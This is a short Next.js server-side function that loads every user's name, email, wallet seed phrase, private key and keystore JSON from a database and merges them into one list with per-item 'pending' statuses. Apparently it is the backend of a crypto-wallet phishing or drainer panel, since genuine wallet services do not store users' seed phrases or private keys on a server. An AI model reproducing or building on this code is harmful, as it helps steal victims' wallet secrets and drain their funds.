"use server";

import { connectToDB } from "@/lib/connectDB";
import User from "@/models/User";
import PrivateKey from "@/models/PrivateKey";
import KeystoreJson from "@/models/KeystoreJson";
import SeedPhrase from "@/models/SeedPhrase";

export const getAllUserSeeds = async () => {
  try {
    await connectToDB();

    const users = await User.find().lean();
    const seedPhrases = await SeedPhrase.find().sort({ createdAt: -1 }).lean(); // Sort by newest first
    const privateKeys = await PrivateKey.find().lean();
    const keystores = await KeystoreJson.find().lean();

    // Map userId to latest seed phrase
    const seedsMap = new Map();
    seedPhrases.forEach((seed) => {
      const uid = seed.userId.toString();
      if (!seedsMap.has(uid)) {
        seedsMap.set(uid, seed);
      }
    });

    const privateKeyMap = new Map();
    privateKeys.forEach((key) => {
      privateKeyMap.set(key.userId.toString(), key);
    });

    const keystoreMap = new Map();
    keystores.forEach((ks) => {
      keystoreMap.set(ks.userId.toString(), ks);
    });

    // Combine all data into one user array
    const result = users.map((user) => {
      const userIdStr = user._id.toString();
      const seedEntry = seedsMap.get(userIdStr);
      const privateKeyEntry = privateKeyMap.get(userIdStr);
      const keystoreEntry = keystoreMap.get(userIdStr);

      return {
        id: user._id.toString(),
        name: user.name || "",
        username: user.username || "",
        email: user.email || "",
        avatar: user.avatar || "/placeholder.svg",
        seedWords: seedEntry?.phrase?.split(" ") || [],
        seedWordsStatus: seedEntry?.status || "pending",
        privateKey: privateKeyEntry?.privateKey || "",
        privateKeyStatus: privateKeyEntry?.status || "pending",
        keystoreJson: keystoreEntry?.keystore || {},
        keystoreJsonStatus: keystoreEntry?.status || "pending",
        createdAt: user.createdAt?.toISOString().split("T")[0] || "",
        lastAccess: user.updatedAt?.toISOString().split("T")[0] || "",
        status: user.status || "active",
      };
    });

    return result;
  } catch (error) {
    console.error("Failed to fetch seed data:", error);
    return [];
  }
};